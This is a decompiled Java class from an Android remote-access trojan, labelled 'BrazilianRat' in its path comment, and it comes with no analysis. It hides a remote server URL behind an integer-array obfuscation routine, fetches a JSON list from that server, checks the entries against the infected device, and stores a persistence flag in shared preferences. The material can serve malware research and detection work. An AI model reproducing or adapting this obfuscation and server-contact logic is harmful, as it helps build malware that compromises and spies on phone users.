package com.irifix;

import android.content.Context;
import android.content.SharedPreferences;
import java.io.IOException;
import okhttp3.ab;
import okhttp3.w;
import okhttp3.z;
import org.json.JSONArray;
import org.json.JSONException;

public class j {
  private static String a = "36978b48";
  
  private static String a() {
    String str = "";
    for (byte b = 0; b < 26; b++) {
      (new int[26])[0] = 8032;
      (new int[26])[1] = 8044;
      (new int[26])[2] = 8044;
      (new int[26])[3] = 8040;
      (new int[26])[4] = 8043;
      (new int[26])[5] = 7986;
      (new int[26])[6] = 7975;
      (new int[26])[7] = 7975;
      (new int[26])[8] = 8049;
      (new int[26])[9] = 8029;
      (new int[26])[10] = 8037;
      (new int[26])[11] = 8038;
      (new int[26])[12] = 8033;
      (new int[26])[13] = 8027;
      (new int[26])[14] = 7974;
      (new int[26])[15] = 8027;
      (new int[26])[16] = 8039;
      (new int[26])[17] = 8037;
      (new int[26])[18] = 7975;
      (new int[26])[19] = 8025;
      (new int[26])[20] = 7975;
      (new int[26])[21] = 8025;
      (new int[26])[22] = 7974;
      (new int[26])[23] = 8040;
      (new int[26])[24] = 8032;
      (new int[26])[25] = 8040;
      int i = (new int[26])[b];
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(str);
      stringBuilder.append((char)(0xFFFF & i - 7928));
      str = stringBuilder.toString();
    } 
    return str;
  }
  
  public static boolean a(Context paramContext) {
    return d(paramContext);
  }
  
  public static boolean b(Context paramContext) {
    return paramContext.getSharedPreferences(a, 0).getBoolean(a, false);
  }
  
  public static void c(Context paramContext) {
    SharedPreferences.Editor editor = paramContext.getSharedPreferences(a, 0).edit();
    editor.putBoolean(a, true);
    editor.apply();
  }
  
  private static boolean d(Context paramContext) {
    String str2;
    String str1 = "";
    try {
      w w = new w();
      this();
      z.a a = new z.a();
      this();
      ab ab = w.a(a.a(a()).a()).a();
      str2 = str1;
      if (ab.c()) {
        str2 = str1;
        if (ab.f() != null)
          str2 = m.a(ab.f().d()); 
      } 
    } catch (IOException iOException) {
      str2 = str1;
    } 
    if (!str2.isEmpty())
      try {
        JSONArray jSONArray = new JSONArray();
        this(str2);
        for (byte b = 0; b < jSONArray.length(); b++) {
          boolean bool = g.b(paramContext, jSONArray.getJSONObject(b).getString("a"));
          if (bool)
            return true; 
        } 
      } catch (JSONException jSONException) {} 
    return false;
  }
}


/* Location:              /home/fahim/Desktop/BrazilianRat-dex2jar.jar!/com/irifix/j.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */